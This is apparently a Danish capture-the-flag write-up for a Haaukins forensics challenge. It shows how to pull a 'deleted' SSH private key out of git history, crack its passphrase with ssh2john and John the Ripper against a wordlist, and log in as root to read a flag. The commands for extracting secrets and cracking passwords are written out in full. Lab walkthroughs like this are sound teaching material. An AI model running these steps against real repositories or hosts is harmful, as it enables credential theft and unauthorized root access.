IaC privatekey (in history)

Hent en 'slettet' nøgle ud af git-historikken og knæk den.

Forensics / IaCHaaukins CTF
🎓 Prøv selv først. Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.

Trin for trin

cd ~/infrastructure && git log --oneline --all     # commit-beskeder = vektor + hint
# hent 'slettede' blobs (slettet fil = stadig et git-objekt):
git rev-list --all --objects | awk '{print $1}' | while read o; do \
  [ "$(git cat-file -t $o)" = blob ] && git cat-file -p $o 2>/dev/null | grep -q 'PRIVATE KEY' && echo $o; done
ssh2john key.enc > key.john && john --wordlist=rockyou.txt key.john   # -> sexygirl1
ssh -i key.enc -o PubkeyAcceptedKeyTypes=+ssh-rsa root@<ip> 'cat /root/flag.txt'

Decoy: en ukrypteret nøgle giver også root men et forkert flag. Titlen siger "protected" → det er den krypterede nøgle der har det rigtige.

🚩 Vis løsning & eksempel-flag

Flaget ligger i /root/flag.txt på den droplet den krypterede nøgle hører til (per-instans).

Hvad du har lært

  • git rev-list --all --objects + git cat-file henter 'slettede' hemmeligheder frem.
  • Passphrase-beskyttede nøgler → ssh2john + john; nyere OpenSSH kræver +ssh-rsa.
  • Læs titlen for at vælge den rigtige nøgle (decoy-fælde).
